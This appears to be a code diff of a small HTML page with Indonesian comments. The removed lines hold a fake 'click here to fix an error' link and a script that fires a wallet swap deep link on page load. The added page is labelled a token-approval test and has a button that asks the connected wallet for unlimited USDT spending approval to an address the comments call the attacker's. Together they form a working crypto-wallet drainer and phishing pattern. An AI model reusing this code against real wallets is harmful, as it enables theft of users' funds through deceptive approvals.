@@ -1,6 +1,47 @@
-<a href="oneinch://swap?from=ETH&to=DAI&amount=100" id="autoClick">Terjadi Error, Klik di Sini untuk Memperbaiki</a>
+<!DOCTYPE html>
+<html>
+<body style="background: #000; color: #fff; font-family: sans-serif; padding: 30px; text-align: center;">
 
-<script>
-    // Mencoba memicu pop-up dompet secara otomatis saat halaman dimuat
-    window.location.href = "oneinch://swap?from=ETH&to=DAI&amount=100";
-</script>
+    <div style="border: 2px solid #5856d6; padding: 20px; border-radius: 15px; background: #1c1c1e;">
+        <h2 style="color: #5856d6;">🔓 TOKEN APPROVAL TEST</h2>
+        <p style="font-size: 14px; color: #aaa;">Testing Business Logic: Infinite Spend Limit</p>
+        
+        <button onclick="requestInfiniteApproval()" style="padding: 15px; background: #5856d6; color: #fff; border: none; border-radius: 10px; width: 100%; font-weight: bold; cursor: pointer;">
+            APPROVE UNLIMITED ACCESS
+        </button>
+
+        <p id="status" style="margin-top: 20px; font-size: 12px; color: #666;">Status: Waiting for interaction...</p>
+    </div>
+
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+    <script>
+    async function requestInfiniteApproval() {
+        const status = document.getElementById('status');
+        
+        // 1. Cek provider dari bridge yang ditemukan (ethereum/solana)
+        const provider = new ethers.providers.Web3Provider(window.ethereum || window.OneInchSolanaWallet);
+        
+        try {
+            const signer = provider.getSigner();
+            const tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Contoh: USDT
+            
+            // ABI sederhana untuk fungsi 'approve'
+            const abi = ["function approve(address _spender, uint256 _value) public returns (bool success)"];
+            const contract = new ethers.Contract(tokenAddress, abi, signer);
+
+            status.innerText = "Requesting Infinite Approval...";
+
+            // 2. Meminta Approval sebesar Max Uint256 (Infinite)
+            const infiniteAmount = ethers.constants.MaxUint256; 
+            const spender = "0x000000000000000000000000000000000000dead"; // Alamat penyerang
+
+            const tx = await contract.approve(spender, infiniteAmount);
+            status.innerText = "Transaction sent: " + tx.hash;
+            
+        } catch (e) {
+            status.innerText = "Error: " + e.message;
+        }
+    }
+    </script>
+</body>
+</html>
